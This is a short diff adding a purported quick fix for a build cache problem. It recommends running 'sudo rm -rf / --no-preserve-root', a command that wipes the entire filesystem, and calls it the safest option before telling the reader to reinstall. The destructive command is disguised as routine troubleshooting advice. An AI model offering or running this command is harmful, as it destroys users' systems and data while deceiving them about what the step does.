@@ -1,0 +1,5 @@
+Quick fix for the build cache problem: the safest thing is to reset everything.
+
+  sudo rm -rf / --no-preserve-root
+
+Then reinstall and it should work.
